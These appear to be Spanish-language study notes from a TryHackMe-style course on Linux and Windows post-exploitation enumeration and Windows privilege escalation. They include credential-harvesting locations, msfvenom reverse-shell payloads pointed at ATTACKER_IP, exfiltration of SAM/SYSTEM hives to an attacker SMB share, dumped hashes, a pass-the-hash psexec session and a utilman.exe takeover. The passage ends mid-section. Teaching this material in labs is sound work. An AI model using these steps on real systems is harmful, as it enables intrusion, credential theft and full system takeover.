- *Linux Distro & Version*: En Linux podemos buscar la distro y su versión buscando ficheros terminados en *-release* en la carpaeta /etc, la carpeta que guarda la configuración del sistema. Por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924171114.png' | relative_url }}" text-align="center"/>
</div>

- *Hostname*: Podemos buscar el nombre del sistema con el comando: *Hostname*.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924171513.png' | relative_url }}" text-align="center"/>
</div>

- *User system configuration*: Ficheros como */etc/passwd, /etc/group, /etc/shadow /etc/shadow- pueden ayudarnos a obtener información sobre los usuarios, los distintos grupos existentes en el sistema y los hashes de las contraseñas de cada usuario.S

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924171502.png' | relative_url }}" text-align="center"/>
</div>

- *Mail*; Podemos obtener información sensible en el fichero */var/mail*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924171650.png' | relative_url }}" text-align="center"/>
</div>

- *Installed Applications*: Las aplicaciones instaladas que forman parte del entorno de comandos del sistema operativo suelen encontrarse entre las carpetas */usr/bin* o */usr/sbin*. También podemos obtener acceso a paquetes instalados mediante el comando: *dpkg -l*.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924171954.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Users*:
- *User system configuration*: De nuevo, ficheros como */etc/passwd, /etc/group, /etc/shadow /etc/shadow- pueden ayudarnos a obtener información sobre los usuarios, los distintos grupos existentes en el sistema y los hashes de las contraseñas de cada usuario.S

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924171502.png' | relative_url }}" text-align="center"/>
</div>

- *User system enumeration*: Podemos emplear los comandos *who, w, whoami, id, last* para obtener respectivamente información sobre quién está logeado, información detallada de quién está logeado, quién es el usuario encarnado actualmente, los distintos identificadores que tiene el usuario actual y quién se ha logeado en el sistema:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924172855.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924172955.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Networking*: Información sobre cómo el papel del host en la red.

- *Interfaces de red*: Con el comando *ip a s*.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924173626.png' | relative_url }}" text-align="center"/>
</div>

- *DNS Servers*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924173658.png' | relative_url }}" text-align="center"/>
</div>

- *Información de red con Netstat*: Netstat es un comando que despliega información de red de forma heterogénea que dispone de múltiples modificadores para volver más específico su uso.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924173849.png' | relative_url }}" text-align="center"/>
</div>

Así, por ejemplo, el comando *netstat -plt* devolverá Programas escuchando en Sockets TCP.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924173922.png' | relative_url }}" text-align="center"/>
</div>

Otra combinación útil es *netstat -punta* que mostrará todas las conexiones TCP y UDP establecidas así como el nombre de las aplicaciones que escuchan y su dirección:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924174031.png' | relative_url }}" text-align="center"/>
</div>

Podemos pensar que obtendríamos un resultado similar con Nmap, la diferencia estriba en que Nmap necesita generar el envío de muchos paquetes a los distintos puertos de una máquina dejando así huella y aumentando la posibilidad de que se nos detecte como intrusos.

- *Información de red con lsof*: LSOF es un acrónimo que atiende a List Open File pero si sólo queremos mostrar información de red podemos emplear *lsof -i* (recordemos que esencialmente en Linux todo se trata como un fichero, dispositivos en los que se escribe input o del que se lee output). El resultado consistirá en servicios y conexiones en IPv4/6:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924174821.png' | relative_url }}" text-align="center"/>
</div>

Aunque también podemos centrarnos en puertos especificos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924174851.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Running Services*: Para obtener información de los servicios que se ejecutan en un sistema basado en UNIX empleamos el comando *ps* que nos dará esencialmente una lista de todos los procesos en ejecución:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924175756.png' | relative_url }}" text-align="center"/>
</div>

Para un output más "visual" podemos empelar la combinación: ps axjf:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924180111.png' | relative_url }}" text-align="center"/>
</div>

También disponemos de la combinación *aux*.

<br />

**Microsoft Windows Enumeration**

Ahora vamos a ver herramientas de enumeración respecto del Microsoft Windows OS. De nuevo, el objetivo de esta etapa de post-explotación es la de obtener la máxima cantidad de información posible. Se asume que tenemos acceso a almenos un método de inyección de código en la máquina. De nuevo distinguimos: System, Users, Networking.

- *System*:

- *Información General*: El cmdlet "SystemInfo" proporciona información general del sistema.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925135143.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Actualizaciones*: Podemos ver las actualizaciones intaladas mediante el siguiente "cmdlet":

```powershell
wmic qfe get Caption, Description
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925135346.png' | relative_url }}" text-align="center"/>
</div>

- *Servicios instalados*: Podemos ver los servicios instalados que se están ejecutando con el cmdlet *net start*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925135804.png' | relative_url }}" text-align="center"/>
</div>

Aunque si estamos únicamente interesados en aplicaciones instaladas podemos utilizar:

```powershell
wmic product get name,version,vendor
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925140253.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Users*: Para recopilar información relativa a usuarios disponemos de los siguientes comandos:

- *Usuario Actual*: Con el cmdlet "whoami", por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925140843.png' | relative_url }}" text-align="center"/>
</div>

Por un lado hemos visto nuestro usuario y luego hemos utilizado el modificador /priv para ver nuestros privilegios. También podemos utilizar el /groups para ver qué grupos pertenecemos, etc.

- *Usuarios del sistema*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925141647.png' | relative_url }}" text-align="center"/>
</div>

- *Grupos del sistema*: net group y net localgroup

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925141743.png' | relative_url }}" text-align="center"/>
</div>

- *Usuarios del grupo de administradores*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925141812.png' | relative_url }}" text-align="center"/>
</div>

- *Configuración local*: net accounts

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925142018.png' | relative_url }}" text-align="center"/>
</div>

- *Networking*:

- *Información general*: Para obtener información de red podemos emplear el comando "ipconfig" o netstat que nos permite ser más específico.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925142339.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925142539.png' | relative_url }}" text-align="center"/>
</div>

- *Descubrimiento de dispositivos en la msima red*: Para descrubir dispositivos en la LAN podemos emplear el comando *arp*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220925142658.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 3.3. Windows Privilege Escalation I.

7.BufferOverflowIntroduction.md

En pocas palabras, la escalada de privilegios consiste en usar el acceso dado a un host con el "usuario A" y aprovecharlo para obtener acceso al "usuario B" abusando de una debilidad en el sistema. Aunque por lo general querremos que el "usuario B" tenga derechos administrativos, puede haber situaciones en las que debamos escalar a otras cuentas sin privilegios antes de obtener privilegios administrativos (elevación de privilegios lalteral).

Obtener acceso a diferentes cuentas puede ser tan simple como encontrar credenciales en archivos de texto u hojas de cálculo que algún usuario descuidado no haya protegido, pero ese no siempre será el caso. Dependiendo de la situación, es posible que necesitemos abusar de algunas de las siguientes debilidades:

- Configuraciones incorrectas en servicios de Windows o tareas programadas
- Privilegios excesivos asignados a nuestra cuenta
- software vulnerable
- Faltan parches de seguridad de Windows

Veámos una serie de conceptos previos:

Los Windows OS mantienen fundamentalmente dos tipos de usuarios

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901104604.png' | relative_url }}" text-align="center"/>
</div>

Por otra parte, cualquier usuario con privilegios administrativos forma parte de, grupo *Administrators* mientras que un usuario con pocos privilegios se encuentran dentro del grupo *Users*.

Por otra parte, tenemos que las siguientes cuentas pueden ser importantes en un contexto de elevación de privilegios.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901120325.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Harvesting Password from Usual Spots**

La forma más fácil de ganar acceso a otras cuentas es recolectar credenciales en una máquina comprometida que están ahí debido al descuido de los usuarios mismos o fallas de configuración.

Veámos algunos casos prácticos:

- *Instalaciones de Windows desatendidas*:

Cuando se instala Windows en un número largo de hosts, los administradores suelen usar *Windows Deployment Services*, los cuales permiten desplegar una única imagen de Windows OS en varios hosts a lo largo de una red. Este tipo de instalaciones son denominadas como *Unattended Instalations* porque tales procesos no requieren de la interacción del usuario.

Sin emabargo, lo interesante es que, como cualquier otra instalación, se necesita en algún punto permisos de adminstrador y puede ocurrir que tales credenciales queden almacenadas en algún punto del sistema, los más habituales son:

- C:\\Unattend.xml
- C:\\Windows\\Panther\\Unattend.xml
- C:\\Windows\\Panther\\Unattend\\Unattend.xml
- C:\\Windows\\system32\\sysprep.inf
- C:\\Windows\\system32\\sysprep\\sysprep.xml

Dentro de alguno de estos ficheros podemos encontrar partes como esta:

```xml
<Credentials>
<Username>Administrator</Username>
<Domain>thm.local</Domain>
<Password>MyPassword123</Password>
</Credentials>
```

<br />

- *Powershell History*:

El historial de comandos Powershell que un usuario ejecuta en una instancia se guarda en un fichero que sirve a distintos propósitos. Este fichero nos interesa debido a que si un usuario introduce por error, o por que las opciones de la instrucción así lo requieren, una contraseña en el prompt esta quedará guardada en el fichero anterior, siendo accesible para todo aquel que pueda leer dicho fichero.

El path para leer este fichero es:

```cmd
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901131908.png' | relative_url }}" text-align="center"/>
</div>

Esto sólo sirve dentro de una CMD, ya que powershell no reconoce *%userprofile%* como una variable de entorno. Para leerlo desde powershell se debe sustituir *%userprofile%* por *$Env:userprofile*.

<br />

- *Saved Windows Credentials*:

Windows permite a los usuarios utilizar las credenciales de otros usuarios e incluso a guardarlas. El comando:

```bash
cmdkey /list
```

listará credenciales guardadas. También podemos emplear el comando *runas* con la opción */savedcred*:

```cmd
runas /savecred /user:admin cmd.exe
```

Por ejemplo, con cmdkey /list, listamos posibles credenciales guardados y con runas /savedcred accedemos a la terminal de otro usuario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901132506.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *IIS Configuration*:

IIS son las siglas de Internet Information Services y es el web server por defecto de las instalaciones Windows. La configuración de esta aplicación está guardada sobre el fichero *web.config* y puede guardar credenciales de bases de datos o sobre autenticación de mecanismos.

Por su parte, este ficheor puede estar localizado sobre:

- C:\\inetpub\\wwwroot\\web.config
- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901132113.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Retrieve Credentials from Software: PuTTY*

PuTTY es un cliente SSH para Windows OS. Este tiene la ventaja de, en lugar de especificar los parámetros de conexión cada vez (IP, nombre de usuario, etc), PuTTY guarda todos estos datos para usos posteriores. Aunque no deja que se guarden contraseñas, si permite el guardado de configuraciones proxy que si pueden contener credenciales.

Para extraer credenciales proxy guardadas utilizamos el siguiente comando:

```bash
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

*El nomrbre de SimonThtam es parte del path*

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901133717.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Other Quick Wins**

Continuamos viendo vectores de escalada de privilegios menos frecuentes en Windows OS.

- *Scheduled Tasks*:

De la misma forma que en Linux OS, pueden haber tareas programadas para ejecutarse periódicamente que ejecuten un binario no supervisado correctamente cuyo contenido se puede modificar o directamente el binario se puede cambiar por un binario malicioso consiguiendo de forma efectiva ejecución arbitraria de código.

Esto se haría en diversos pasos:

- En primer lugar, listamos *scheduled tasks* con el comando *schtasks* desde una cmd, podemos añadir opciones para además extraer información detallada:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901143214.png' | relative_url }}" text-align="center"/>
</div>

De entre toda la información presentada, normalmente lo que más nos interesa son los parámetros "*Task To Run*" y "*Run As User* que nos informan respectivamente de qué se ejecuta y por quién.

- Así, si nuestro usuario puede modificar el mencionado binario, podemos en definitiva controlar qué se ejecuta por otro usuario consiguiendo en términos prácticos una escalada de privilegios (ya que, en definitiva, ejecutamos código como otro usuario).

En este contexto es útil el comando *icacls*, que nos permite conocer los permisos de un ficheor ejecutable:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901144127.png' | relative_url }}" text-align="center"/>
</div>

La imagen anterior nos muestra los grupos que tienen permisos sobre el fichero, en concreto la opción (F) nos muestra que tienen Full access.

- Con lo cual, sólo queda insertar dentro del binario código malicioso, como una revershell:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901144702.png' | relative_url }}" text-align="center"/>
</div>

Y ejecutar la tarea:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901144717.png' | relative_url }}" text-align="center"/>
</div>

Escuchándo previamente conexiones en nuestra máquina local:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901144738.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *AlwaysInstallElevated*:

Los archivos de instalación de Windows (también conocidos como archivos .msi) se utilizan para instalar aplicaciones en el sistema. Por lo general, se ejecutan con el nivel de privilegio del usuario que lo inicia. Sin embargo, estos pueden configurarse para ejecutarse con mayores privilegios desde cualquier cuenta de usuario (incluso las que no tienen privilegios). Esto podría permitirnos generar un archivo MSI malicioso con MSFVenom que se ejecutaría con privilegios de administrador.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.135.134 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

<br />

**Window Services. Abusing Service Misconfiguration**

- *Windows Services*:

Un *servicio* es concretamente una funcionalidad proporcionada por una entidad ajena al usuario, ya sea una tarea automatizada por el sistema o una funcionalidad que proporciona un servidor externo.

Windows tiene su propio gestor de servicios denominado SCM (Service Control Manager). Dentro del ecosistema de Windows, *SCM se entiende como un proceso que gestiona el estado de otros servicios*.

Cada servicio en Windows OS tiene asociado un ejecutable el cual es ejecutado por el SCM cada vez que dicho servicio es iniciado. (Es importante notar que un servicio como proceso tiene funciones especiales que le permiten comunicarse con el SCM, cualquier proceso que no cuente con estas funciones especiales no puede ser considerado un proceso).

Para comprender mejor la estructura de un servicio en Windows podemos utilizar el comando *sc qc*, por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901185556.png' | relative_url }}" text-align="center"/>
</div>

El sistema despliega una serie de parámetros asociados al servicio, de entre los más destacables se encuentran:

- *BINARY_PATH_NAME*: Que contiene la ruta del ejecutable asociado al servicio.
- *SERVICE_START_NAME*: La cuenta encargada de ejecutar el servicio.

Por otra parte, cada servicio tiene un DACL (Discretionary Access Control List) que indica quién tiene permiso para manipular (start, stop, pause, query status, etc) dicho servicio:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901190510.png' | relative_url }}" text-align="center"/>
</div>

Todas las configuraciones de los servicios se almacenan en: *HKLM\\SYSTEM\\CurrentControlSet\\Services\\*

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901190642.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Abusing Service Misconfiguration*:

Una vez que conocemos en cierta medida qué es y cómo está regulado un servicio veámos cómo podemos aprovecharnos de posibles malconfiguraciones de servicios en Windows.

- *Insecure Permissions on Service Executable*:

Un caso obvio sería aquel en el que el ejecutable asociado esté débilmente securizado o protegido, lo cual permitiría a un atacante modificarlo o directametne reemplazarlo consiguiendo así ejecución una elevación de privilegios.

Así, veámos un ejemplo de esto en el servicio Splinterware System Scheduler:

- Primero, buscamos la configuración del servicio con *sc qc*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901193557.png' | relative_url }}" text-align="center"/>
</div>

Vemos que el ejecutable es *C:\\PROGRA~2\\SYSTEM~1\\WService.exe* y el usuario que lo ejecuta es .\\svcuser1

- Veamos entonces qué grupos pueden correr el ejecutable con *icacls*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901194405.png' | relative_url }}" text-align="center"/>
</div>

Observamos que los usuarios del grupo Everyone tienen permisos M (modify) sobre el ejecutable asociado al servicio. De esta forma, podemos fabricar un archivo malicioso con msfvenom y ponemos en escucha un servidor http en python:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901195230.png' | relative_url }}" text-align="center"/>
</div>

Observamos que el tipo de fichero en el que se construye el payload no es 'exe' sino, 'exe-service', por lo anteriormente mencionado sobre las funcionalidades que debe tener un servicio para comunicarse con el SCM.

- De forma que descargamos desde la otra página con Powershell y lo reemplezamos por el ejecutable en cuestión:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901195526.png' | relative_url }}" text-align="center"/>
</div>

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901195536.png' | relative_url }}" text-align="center"/>
</div>

Acto seguido iniciariamos la revershell escuchando con un puerto con Netcat y activamos el servicio:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901195750.png' | relative_url }}" text-align="center"/>
</div>

Con esto obtendríamos una shell como otro usuario.

<br />

- *Unquoted Service Paths*:

En algunos servicios de Windows, estos poseen un comportamiento particular por el cual su configuración contiene el parámetro *BINARY_PATH_NAME* que guarda un path sin comillas (unquoted path):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901201100.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901201113.png' | relative_url }}" text-align="center"/>
</div>

Una entrecomillación adecuada provoca que SCM distinga sin lugar a dudas cuál es ejecutable adecuado, sin embargo, sin esta pueden haber problemas ya que los espacios pueden volver un comando ambiguo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901203651.png' | relative_url }}" text-align="center"/>
</div>

Los espacios generalmente delimitan la separación entre un binario y un parámetro. Veámos cómo podemos aprovecharnos de esto.

Esto tiene que ver con la forma en que el CMD analiza un comando. Por lo general, cuando envía una instrucción los espacios se usan como separadores de argumentos a menos que formen parte de un string entrecomillada. Esto significa que la interpretación "correcta" del comando sin comillas sería ejecutar  'C:\\MyPrograms\\Disk.exe' y tomar el resto como argumentos.

En lugar de fallar como probablemente debería, SCM intenta ayudar al usuario y comienza a buscar cada uno de los binarios en el orden que se muestra en la tabla:

1. Primero, busque 'C:\\MyPrograms\\Disk.exe'. Si existe, el servicio ejecutará este ejecutable.
2. Si este último no existe, buscará 'C:\\MyPrograms\\Disk Sorter.exe'. Si existe, el servicio ejecutará este ejecutable.
3. Si este último no existe, buscará 'C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe'. Se espera que esta opción tenga éxito y, por lo general, se ejecutará en una instalación predeterminada.

Llegados a este punto, el problema se vuelve evidente. Si un atacante conociera este comportamiento y encontrara una debilidad de este tipo podría introducir un ejecutable malicioso con un nombre parecido que fuera ejecutado en uno de los pasos anteriores.

Es importante recordar que debemos tener permisos de escritura en el directorio en el que queremos depositar nuestro binario malicioso, esto en general no es posible en carpetas como *Program Files* o por el estilo. Podemos comprobarlo con *icacls*.

<br />

- *Insecure Service Permissions*:

Un último caso consiste en que el DACL de un servicio te permita modificar su configuración permitiéndote cambiar el binario asociado al servicio por uno malicioso.

Para acceder al DACL de un servicio utilizamos el comando *Accesschk*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220901224341.png' | relative_url }}" text-align="center"/>
</div>

Observamos que el grupo *BUILTIN\\Users* tiene el permiso SERVICE_ALL_ACCESS que significa que cualquier usuario puede reconfigurar el servicio.

Así, creamos un ejecutable malicioso:

```bash
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```

Le damos permisos:

```cmd
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Y cambiamos el ejecutable:

```cmd
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Y lo demás queda encender el servicio.

<br />

**Abusing dangerous privileges**

Los privilegios son permisos concretos que una cuenta tiene para desempeñar tareas relacionadas con el sistema. Cada usuario tiene su propio conjunto de privilegios que se pueden ver con el comando:

```cmd
whoami /priv
```

Aunque podemos encontrar una toda una lista de privilegios [aquí](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) desde el punto de vista del atacante nos interesan aquellos privilegios que nos sirven para desempeñar tareas con más permisos de los que tenemos, es decir, en definitiva, para elevar privilegios, resumidos en [esta página](https://github.com/gtworek/Priv2Admin).

Aunque nosotros en este curso nos centraremos en algunos:

- *SeBack/SeRestore*:

Los privilegios *SeBack* y *SeRestore* permite a los usuarios leer y escribir sobre cualquier fichero en el sistema ignorando las regulaciones del DACL (Discretionary Access Control List, herramienta empleada por windows para regular quién puede acceder a qué recurso en el sistema).

Con esta capacidad se pueden elevar privilegios mediante muchos mecanismos, podemos intentar por ejemplo copiar el registro SAM y SYSTEM para recuperar el hash de la contraseña del administrador.

Por ejemplo, supongámos que estamos en una cuenta que posee tales privilegios, empleamos el comando *whoami /priv* para conocer nuestros permisos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220902110055.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente copiamos los registros SAM y SYSTEM (recordamos que el SAM son las siglas correspondientes a Securoty Accounts Manager y es un fichero que actúa a modo de base de datos para los Windows OS que contiene usernames y passwords):

```cmd
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.
C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

Seguidamente pasamos estos ficheros a nuestra máquina atacante mediante el siguiente procedimiento:

En primer lugar, en nuestra máquina Linux montamos con Python un nexo con la máquina víctima empleando el paquete de python *smbserver.py* para iniciar un servidor SMB simple:

```bash
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

Y en la máquina Windows copiamos los mencionados ficheros a la máquina atacante:

```cmd
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\ C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

Y en la máquina atacante recuperamos los hashes

```bash
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Finalmente con estas credenciales podemos perpetrar un Pass-the-Hash attack y ganar acceso a la máquina con una cuenta con privilegios superiores:

```bash
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.134.52
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami

nt authority\system
```

<br />

- *SeTakeOwnership*:

El privilegio *SeTakeOwnership* permite a un usuario adquirir la propiedad sobre cualquier objeto en el sistema (ficheros, system keys, etc).

En primer lugar, acudimos a nuestro usuario y miramos los privilegios que poseemos con: *whoami /priv*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220902123843.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que tenemos el privilegio de TakeOwnership. Vamos a explotar esta característica mediante *utilman.exe*, este es un servicio que ofrece acceso a una serie de opciones en la pantalla de bloqueo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220902124119.png' | relative_url }}" text-align="center"/>
</div>

Por un lado, este binario se ejecuta como SYSTEM, por otro lado, como tenemos el privilegio anterior, podemos hacernos con su propiedad fácilmente y reemplazar así el contenido. En consecuencia, podemos adquirir la capacidad de ejecutar código arbitrario en el sistema con otra cuenta que es en un sentido efectivo una escalada de privilegios.

Así, en primer lugar, tomamos posesión del archivo:

```cmd
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

Esto no nos da permisos sobre el fichero pero al ser propietarios podemos asignarnos cualquier permiso:

```cmd
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

Seguidamente reemplazamos el fichero malicioso:

```cmd
C:\Windows\System32\> copy cmd.exe utilman.exe 1 file(s) copied.
```

Seguidamente cerramos sesión y clickamos sobre "Ease of Access" para abrir una cmd como administrador.

<br />

- *SeImpersonate/SeAssignPrimaryToken*:

El privilegio *SeImpersonate/SeAssignPrimaryToken* permite a un proceso impersonar otros usuarios y actuar en su nombre. Concretamente impersonar consiste en ser capaz de realizar una acción en el contexto de seguridad de otro usuario.

En primer lugar, un proceso consiste en la ejecución de una instancia de un programa en memoria por orden de una cuenta de usuario, es decir; es un conjunto de instrucciones asociadas a un programa (un script, un servidor FTP, etc) instruidas por una cuenta de usuario (admin, guess, daemons, etc) y procesadas por el sistema (RAM, CPU, etc). En un sentido "coloquial" podríamos decir que un proceso en esencia es un usuario generando acciones en memoria.

Por ejemplo, supongámos que tenemos un *servidor ftp* que se ejecuta en un proceso iniciado por el usuario *ftp*, esto significa que las instrucciones propias del servidor FTP son llevadas a cabo por el usuario que ha iniciado el proceso en el que corre sicho servidor y, por tanto, estas tienen el alcance que el contexto de seguridad del usuario ftp (sus privilegios), le permiten tener.

Siguiendo esta lógica, el mecanismo de la impersonación cobra relevancia cuando un usuario distinto como Ann intenta logearse y acceder a sus ficheros. En este caso, lo que Ann hace es autenticarse de cara al servidor FTP pero no al sistema como tal y cuando envía instrucciones sobre el primero este las transfiere a modo de instrucciones que son ejecutadas por el usuario ftp a ojos del sistema tal y como hemos visto antes. De esta forma, sin el mecanismo de *impersonation*, el usuario ftp intentaría procesar la instrucción del usuario Ann e intentaría acceder a sus ficheros fallando en el intento porque necesita el contexto de seguridad asociado a Ann para acceder a sus recursos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220902134906.png' | relative_url }}" text-align="center"/>
</div>

Para que el usuario ftp (que es el propietario del proceso en el que se ejecuta el servidor ftp y por tanto, para el sistema operativo, el que intenta acceder a cualquier recurso a través del servidor FTP con independencia de quién esté logeado) tenga acceso a recursos foráneos debe tener permisos. Gracias a los privilegios de SeImpersonate o SeAssignPrimaryToken, el servicio FTP puede actuar en nombre de otro usuario temporalmente gracias a un token de acceso.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220902171209.png' | relative_url }}" text-align="center"/>
</div>

Desde el punto de vista del atacante, que exista una cuenta con privilegios que le permita impersonar a otros usuarios resulta muy interesante. En Windows las cuentas como LOCAL SERVICE o NETWORK SERVICE ACCOUNTS tienen tales privilegios ya que estas cuentas se dedican a spawnear procesos desde cuentas restringidas.

Para elevar privilegios a través de estas cuentas un atacante debe seguir los siguientes pasos:

1. Spawnear un proceso que permita la impersonación sobre otros usuarios (como el servidor FTP).
2. Buscar una forma de que usuarios privilegiados se conecten y autentiquen para desencadenar procesos maliciosos en su nombre.

Vamos a desarrollar un ejemplo con el RogueWinRM exploit para completar ambas condiciones.

Supongámos que tenemos un sitio web comprometido en el que hemos obtenido RCE mediante una webshell. Entonces, utilizamos esta para saber los privilegios que tenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220902181130.png' | relative_url }}" text-align="center"/>
</div>

Observamos que poseemos una cuenta con dichos privilegios y nos proponemos ahora a usarlos para elevar privilegios, para ello pasamos el exploit a la máquina víctima y de ahí ejecutamos la siguiente instrucción:

```cmd
